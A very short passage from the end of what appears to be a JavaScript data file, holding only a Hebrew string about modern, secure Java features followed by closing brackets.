      פיצ'רים מודרניים ובטוחים ב-Java.
    `,
  },
];
